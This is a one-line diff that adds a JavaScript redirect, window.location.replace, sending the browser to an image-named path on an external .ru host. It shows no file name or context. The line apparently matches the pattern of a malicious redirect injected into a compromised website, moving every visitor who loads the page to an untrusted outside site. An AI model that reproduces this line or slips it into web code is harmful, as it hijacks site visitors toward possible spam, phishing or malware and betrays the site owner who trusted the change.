@@ -1,0 +1,1 @@
+window.location.replace("http://priscree.ru/img/ef3e879b1c16f4.jpg")
